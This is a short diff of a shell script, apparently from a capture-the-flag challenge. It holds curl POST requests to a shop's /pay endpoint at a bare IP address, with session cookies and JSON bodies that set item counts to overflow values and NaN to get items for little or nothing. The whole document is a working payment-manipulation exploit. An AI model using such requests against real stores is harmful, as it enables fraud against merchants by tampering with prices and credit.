@@ -1,3 +1,3 @@
-# curl http://46.101.173.61/pay -X POST -v -H "Content-Type: application/json" --cookie "session=eyJjb3Vwb25zIjpbXSwiY3JlZGl0IjowfQ.DcjxRg.7o9VxvfmImORsdpW4EvTdzwG5R8" -d '{"card":[{"name": "fake1", "count": 1000e1000}, {"name": "fake2", "count": 0.10}], "coupon":"ZkxAX19n"}'
-
-curl http://46.101.173.61/pay -X POST -v -H "Content-Type: application/json" --cookie "session=eyJjb3Vwb25zIjpbIlpreEFYMTluIl0sImNyZWRpdCI6TmFOfQ.Dcjxbg.f-UWTtBLt7FaY-rrLCo-PCyOeLc" -d '{"card":[{"name": "fake1", "count": 1}, {"name": "asis", "count": 0.01}], "coupon":""}'
+curl http://46.101.173.61/pay -X POST -v -H 'Content-Type: application/json' \
+--cookie "session=eyJjb3Vwb25zIjpbIlpreEFYMTluIl0sImNyZWRpdCI6TmFOfQ.Dcjxbg.f-UWTtBLt7FaY-rrLCo-PCyOeLc" \
+-d '{"card":[{"name": "asis", "count": NaN}], "coupon":""}'
